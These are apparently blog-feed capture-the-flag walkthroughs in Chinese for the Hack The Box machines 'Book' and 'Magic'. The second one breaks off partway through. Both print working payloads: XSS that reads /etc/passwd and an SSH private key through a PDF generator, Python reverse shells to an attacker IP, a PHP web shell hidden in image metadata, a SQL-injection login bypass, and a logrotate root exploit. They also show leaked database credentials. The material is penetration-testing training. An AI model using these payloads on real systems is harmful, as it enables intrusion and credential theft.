<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 10.10.10.176</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.10.10.176&#x2F;index.php</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;mq1sob5pmstq0i55csvmlafcre</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name&#x3D;admin&amp;email&#x3D;admin@book.htb&amp;password&#x3D;123321</span><br></pre></td></tr></table></figure>
<p>并且查看注册页面源码发现email字段有JS验证</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="built_in">document</span>.forms[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;name&quot;</span>].value;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="built_in">document</span>.forms[<span class="string">&quot;myForm&quot;</span>][<span class="string">&quot;email&quot;</span>].value;</span><br><span class="line">  <span class="keyword">if</span> (x == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    alert(<span class="string">&quot;Please fill name field. Should not be more than 10 characters&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (y == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    alert(<span class="string">&quot;Please fill email field. Should not be more than 20 characters&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的越权方式：在<code>admin@book.htb</code>后面用空格填充至20个字符在加上一个任意字符，一共21个字符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;admin&amp;email&#x3D;admin@book.htb      C&amp;password&#x3D;123321</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414221831.png" alt=""></p>
<p>注册成功后，用<code>admin@book.htb</code>登录站点，发现自己的身份仍然是<code>User</code>，转而到<code>http://10.10.10.176/admin</code>页面登录，然而结果是Nope，猜测一下原因可能是因为<code>name</code>字段重复，再重新走一遍注册流程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;admin2&amp;email&#x3D;admin@book.htb      C&amp;password&#x3D;123321</span><br></pre></td></tr></table></figure>
<p>登录admin站点成功。接着开始尝试Collections模块，在用户端上传一个pdf文件，内容随意</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414222115.png" alt=""></p>
<p>在管理面板中下载Collections PDF</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414221929.png"  />
<p>可以看到刚刚上传的pdf文件</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414222347.png" style="zoom: 80%;" />
<p>梳理一下逻辑，我们提供的数据可以呈现在pdf中，因此我们可以通过XSS提取本地文件。Google一下LFI XSS，Noob-ninja已经提供了相关的利用方式：<a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html</a></p>
<p>payload：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;x=<span class="keyword">new</span> XMLHttpRequest;x.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)&#125;;x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414223957.png" style="zoom: 80%;" />
<p>上传之后再从管理面板下载Collections PDF</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414224229.png" style="zoom:50%;" />
<p>成功拿到一个用户名<code>reader</code>，再去主目录拿SSH key</p>
<p>payload：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;x=<span class="keyword">new</span> XMLHttpRequest;x.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">document</span>.write(<span class="built_in">this</span>.responseText)&#125;;x.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///home/reader/.ssh/id_rsa&quot;</span>);x.send();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200414224525.png" style="zoom:50%;" />
<p>但是PDF显示有问题，用pdfminner.six工具转换成text</p>
<blockquote>
<p><a href="https://github.com/pdfminer/pdfminer.six">https://github.com/pdfminer/pdfminer.six</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 tools&#x2F;pdf2text.py 68498.pdf &gt; id_rsa</span><br></pre></td></tr></table></figure>
<p>SSH reader login</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ssh -i id_rsa.txt reader@book.htb</span><br><span class="line">The authenticity of host &#39;book.htb (10.10.10.176)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:QRw8pCXg7E8d9sWI+0Z9nZxClJiq9&#x2F;eAeT&#x2F;9wUfoQQk.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;book.htb&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 18.04.2 LTS (GNU&#x2F;Linux 5.4.1-050401-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon Mar  2 15:30:16 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.28               Processes:            194</span><br><span class="line">  Usage of &#x2F;:   27.1% of 19.56GB   Users logged in:      1</span><br><span class="line">  Memory usage: 39%                IP address for ens33: 10.10.10.176</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch</span><br><span class="line"></span><br><span class="line">114 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Apr 14 06:05:21 2020 from 10.10.17.235</span><br><span class="line">reader@book:~$ id</span><br><span class="line">uid&#x3D;1000(reader) gid&#x3D;1000(reader) groups&#x3D;1000(reader)</span><br><span class="line">reader@book:~$ ls</span><br><span class="line">backups  lse.sh  user.txt</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>主目录下有一个backups文件夹：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~$ cd backups&#x2F;</span><br><span class="line">reader@book:~&#x2F;backups$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 reader reader 4096 Jan 29 13:05 .</span><br><span class="line">drwxr-xr-x 7 reader reader 4096 Jan 29 13:05 ..</span><br><span class="line">-rw-r--r-- 1 reader reader    0 Jan 29 13:05 access.log</span><br><span class="line">-rw-r--r-- 1 reader reader   91 Jan 29 13:05 access.log.1</span><br><span class="line">reader@book:~&#x2F;backups$ cat access.log.1 </span><br><span class="line">192.168.0.104 - - [29&#x2F;Jun&#x2F;2019:14:39:55 +0000] &quot;GET &#x2F;robbie03 HTTP&#x2F;1.1&quot; 404 446 &quot;-&quot; &quot;curl&quot;</span><br></pre></td></tr></table></figure>
<p>用pspy监控靶机运行的服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2020&#x2F;04&#x2F;14 10:17:39 CMD: UID&#x3D;0    PID&#x3D;78202  | sleep 5 </span><br><span class="line">2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0    PID&#x3D;78205  | &#x2F;usr&#x2F;sbin&#x2F;logrotate -f &#x2F;root&#x2F;log.cfg </span><br><span class="line">2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0    PID&#x3D;78204  | &#x2F;bin&#x2F;sh &#x2F;root&#x2F;log.sh </span><br><span class="line">2020&#x2F;04&#x2F;14 10:17:44 CMD: UID&#x3D;0    PID&#x3D;78206  | sleep 5 </span><br></pre></td></tr></table></figure>
<p>如果logrotate是以root身份运行，并且普通用户对logrotate轮询的日志文件具有写的权限，那么就有一种漏洞利用可以提权。我们先来验证一下access.log是不是轮询的文件，向其中写入10M的随机比特流数据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~&#x2F;backups$ head -c 10M &lt; &#x2F;dev&#x2F;urandom &gt; access.log</span><br><span class="line">reader@book:~&#x2F;backups$ ls -la</span><br><span class="line">total 10252</span><br><span class="line">drwxr-xr-x 2 reader reader     4096 Jan 29 13:05 .</span><br><span class="line">drwxr-xr-x 7 reader reader     4096 Jan 29 13:05 ..</span><br><span class="line">-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log</span><br><span class="line">-rw-r--r-- 1 reader reader       91 Jan 29 13:05 access.log.1</span><br><span class="line">reader@book:~&#x2F;backups$ ls -la</span><br><span class="line">total 10252</span><br><span class="line">drwxr-xr-x 2 reader reader     4096 Apr 15 02:35 .</span><br><span class="line">drwxr-xr-x 7 reader reader     4096 Jan 29 13:05 ..</span><br><span class="line">-rw-r--r-- 1 reader reader        0 Apr 15 02:35 access.log</span><br><span class="line">-rw-r--r-- 1 reader reader 10485760 Apr 15 02:35 access.log.1</span><br><span class="line">-rw-r--r-- 1 reader reader       91 Jan 29 13:05 access.log.2</span><br></pre></td></tr></table></figure>
<p>很明显，多了一个<code>access.log.2</code>日志文件。</p>
<p>从https://github.com/whotwagner/logrotten下载logrotate exploit到本机，上传至靶机的主目录并编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~ gcc -o logrotten logrotten.c</span><br></pre></td></tr></table></figure>
<p>再准备一个payloadfile，写入reverse shell，在本机监听4444端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~ cat payloadfile</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.55&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<p>然后执行exploit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reader@book:~ .&#x2F;logrotten -p .&#x2F;payloadfile &#x2F;home&#x2F;reader&#x2F;backups&#x2F;access.log</span><br><span class="line">Waiting for rotating backups&#x2F;access.log...</span><br></pre></td></tr></table></figure>
<p>于此同时，在另外一个终端登录靶机，向轮询日志中写入随机数据，观察主机4444端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$nc -nlvp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [10.10.15.152] from (UNKNOWN) [10.10.10.176] 50008</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt</span><br><span class="line">84da9--------------------0dd89714</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Reference">0x04 Reference</h2>
<p><a href="https://github.com/whotwagner/logrotten">https://github.com/whotwagner/logrotten</a></p>
<p><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf</a></p>
<p><a href="https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html">https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Magic-Walkthrough</title>
    <url>/Target_drone/HackTheBox/15.HTB-Magic-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Magic-Walkthrough">HTB::Magic Walkthrough</h1>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200428124359.png" alt=""></p>
<h2 id="0x02-Tools-and-Tips">0x02 Tools and Tips</h2>
<ul>
<li>nmap</li>
<li>exiftool</li>
<li><code>LinEnum.sh</code></li>
<li>SQL Injection</li>
<li>mysqldump</li>
<li>sysinfo</li>
<li>PATH variable</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Initial-Enueration">Initial Enueration</h3>
<p>端口扫描：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -A -Pn -T4 -p- 10.10.10.185</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-04-23 10:22 EDT</span><br><span class="line">Stats: 0:10:27 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 22.07% done; ETC: 11:10 (0:36:54 remaining)</span><br><span class="line">Warning: 10.10.10.185 giving up on port because retransmission cap hit (6).</span><br><span class="line">Nmap scan report for 10.10.10.185</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 65455 closed ports, 78 filtered ports</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)</span><br><span class="line">|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)</span><br><span class="line">|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)</span><br><span class="line"></span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Magic Portfolio</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6500.05 seconds</span><br></pre></td></tr></table></figure>
<p>常规80端口，进入站点发现有一个Login界面，随便试一下，又是常规的SQL Injection，Burp修改数据，payload万能密码<code>admin' or 1=1--+</code>即可。</p>
<p>登录成功后，有一个上传图片的功能，经过尝试之后发现只能上传固定的图片格式的文件，但是好像没有对图片内容进行检查。随便找一个正常文件，用exiftool工具写入payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exiftool -Comment&#x3D;&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; normal.jpg</span><br></pre></td></tr></table></figure>
<p>更改后缀名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv normal.jpg normal.php.jpg</span><br></pre></td></tr></table></figure>
<p>上传文件后，在主页查看页面源代码，发现上传图片的相对路径是<code>images/uploads/normal.php.jpg</code>，访问该路径发现可以正常回显。</p>
<p>再在url上添加下面内容作为cmd参数，用来执行reverse shell，在本机监听相应的端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：这个靶机只有python3的环境</p>
</blockquote>
<p>成功拿到www-data权限：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">10.10.10.185: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.14.16] from (UNKNOWN) [10.10.10.185] 58816</span><br><span class="line">&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br><span class="line">$ python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$</span><br></pre></td></tr></table></figure>
<h3 id="Getting-User-Access">Getting User Access</h3>
<p>查找敏感文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic&#x2F;images&#x2F;uploads$ cd ..&#x2F;..&#x2F;</span><br><span class="line">cd ..&#x2F;..&#x2F;</span><br><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ ls</span><br><span class="line">ls</span><br><span class="line">assets  db.php5  images  index.php  login.php  logout.php  upload.phpwww-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ cat db.php5</span><br><span class="line">cat db.php5</span><br><span class="line">&lt;?php</span><br><span class="line">class Database</span><br><span class="line">&#123;</span><br><span class="line">    private static $dbName &#x3D; &#39;Magic&#39; ;</span><br><span class="line">    private static $dbHost &#x3D; &#39;localhost&#39; ;</span><br><span class="line">    private static $dbUsername &#x3D; &#39;theseus&#39;;</span><br><span class="line">    private static $dbUserPassword &#x3D; &#39;iamkingtheseus&#39;;</span><br><span class="line"></span><br><span class="line">    private static $cont  &#x3D; null;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        die(&#39;Init function is not allowed&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function connect()</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; One connection through whole application</span><br><span class="line">        if ( null &#x3D;&#x3D; self::$cont )</span><br><span class="line">        &#123;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                self::$cont &#x3D;  new PDO( &quot;mysql:host&#x3D;&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname&#x3D;&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);</span><br><span class="line">            &#125;</span><br><span class="line">            catch(PDOException $e)</span><br><span class="line">            &#123;</span><br><span class="line">                die($e-&gt;getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        return self::$cont;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static function disconnect()</span><br><span class="line">    &#123;</span><br><span class="line">        self::$cont &#x3D; null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有一个配置文件，用户名是<code>theseus</code>，密码是<code>iamkingtheseus</code>，尝试用这个密码切换用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ su theseus</span><br><span class="line">su theseus</span><br><span class="line">Password: iamkingtheseus</span><br><span class="line"></span><br><span class="line">su: Authentication failure</span><br></pre></td></tr></table></figure>
<p>密码错误，这个应该是MySQL数据库的登录密码。当我准备用mysql命令时，提示我<code>apt-get install</code>，但是靶机上明明就运行着MySQL服务，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;Magic$ ls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysql</span><br><span class="line">ls -la &#x2F;usr&#x2F;bin&#x2F; | grep mysql</span><br><span class="line">-rwxr-xr-x  1 root root     3627200 Jan 21 06:10 mysql_config_editor</span><br><span class="line">-rwxr-xr-x  1 root root    22558552 Jan 21 06:10 mysql_embedded</span><br><span class="line">-rwxr-xr-x  1 root root     5179616 Jan 21 06:10 mysql_install_db</span><br><span class="line">-rwxr-xr-x  1 root root     3616952 Jan 21 06:10 mysql_plugin</span><br><span class="line">-rwxr-xr-x  1 root root     3784424 Jan 21 06:10 mysql_secure_installation</span><br><span class="line">-rwxr-xr-x  1 root root     3653288 Jan 21 06:10 mysql_ssl_rsa_setup</span><br><span class="line">-rwxr-xr-x  1 root root     3569976 Jan 21 06:10 mysql_tzinfo_to_sql</span><br><span class="line">-rwxr-xr-x  1 root root     4442320 Jan 21 06:10 mysql_upgrade</span><br><span class="line">-rwxr-xr-x  1 root root     3799752 Jan 21 06:10 mysqladmin</span><br><span class="line">lrwxrwxrwx  1 root root          10 Jan 21 06:10 mysqlanalyze -&gt; mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root     4068280 Jan 21 06:10 mysqlbinlog</span><br><span class="line">-rwxr-xr-x  1 root root     3825320 Jan 21 06:10 mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root       26952 Jan 21 06:10 mysqld_multi</span><br><span class="line">-rwxr-xr-x  1 root root       28448 Jan 21 06:10 mysqld_safe</span><br><span class="line">-rwxr-xr-x  1 root root     3875176 Jan 21 06:10 mysqldump</span><br><span class="line">-rwxr-xr-x  1 root root        7865 Jan 21 06:10 mysqldumpslow</span><br><span class="line">-rwxr-xr-x  1 root root     3791912 Jan 21 06:10 mysqlimport</span><br><span class="line">lrwxrwxrwx  1 root root          10 Jan 21 06:10 mysqloptimize -&gt; mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root     4286120 Jan 21 06:10 mysqlpump</span><br><span class="line">lrwxrwxrwx  1 root root          10 Jan 21 06:10 mysqlrepair -&gt; mysqlcheck</span><br><span class="line">-rwxr-xr-x  1 root root       39016 Jan 12  2018 mysqlreport</span><br><span class="line">-rwxr-xr-x  1 root root     3790504 Jan 21 06:10 mysqlshow</span><br><span class="line">-rwxr-xr-x  1 root root     3809512 Jan 21 06:10 mysqlslap</span><br></pre></td></tr></table></figure>
<p>找到了 <a href="https://support.hostway.com/hc/en-us/articles/360000220190-How-to-backup-and-restore-MySQL-databases-on-Linux">dump MySQL database</a>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqldump --databases Magic -utheseus -piamkingtheseus</span><br></pre></td></tr></table></figure>
<p>得到用户名和密码<code>admin:Th3s3usW4sK1ng</code>。</p>
<p>再把本机的SSH public key加入到靶机的<code>/home/thesues/.ssh/authenticated_keys</code>，SSH直接登录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh theseus@10.10.10.185</span><br><span class="line">The authenticity of host &#39;10.10.10.185 (10.10.10.185)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:yx0Y6af8RGpG0bHr1AQtS+06uDomn1MMZVzpNaHEv0A.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;10.10.10.185&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU&#x2F;Linux 5.3.0-42-generic x86_64)</span><br><span class="line"></span><br><span class="line">* Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line">* Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line">* Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line">* Canonical Livepatch is available for installation.</span><br><span class="line">  - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https:&#x2F;&#x2F;ubuntu.com&#x2F;livepatch</span><br><span class="line">     </span><br><span class="line">29 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span><br><span class="line">Last login: Sat Apr 25 22:27:50 2020 from 10.10.14.44</span><br><span class="line">theseus@ubuntu:~$ id</span><br><span class="line">uid&#x3D;1000(theseus) gid&#x3D;1000(theseus) groups&#x3D;1000(theseus),100(users)</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>查找SUID文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:~&#x2F;.ssh$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;pppd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;arping</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;vmware-user-suid-wrapper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">...</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;sysinfo</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br></pre></td></tr></table></figure>
<p>可以发现一个不太寻常SUID：<code>sysinfo</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:~$ file &#x2F;bin&#x2F;sysinfo</span><br><span class="line">file &#x2F;bin&#x2F;sysinfo</span><br><span class="line">&#x2F;bin&#x2F;sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;l, for GNU&#x2F;Linux 3.2.0, BuildID[sha1]&#x3D;9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theseus@ubuntu:~$ sysinfo</span><br><span class="line">sysinfo</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Hardware Info&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">H&#x2F;W path           Device      Class      Description</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">                               system     VMware Virtual Platform</span><br><span class="line">&#x2F;0                             bus        440BX Desktop Reference Platform</span><br><span class="line">&#x2F;0&#x2F;0                           memory     86KiB BIOS</span><br><span class="line">&#x2F;0&#x2F;1                           processor  AMD EPYC 7401P 24-Core Processor</span><br><span class="line">&#x2F;0&#x2F;1&#x2F;0                         memory     16KiB L1 cache</span><br><span 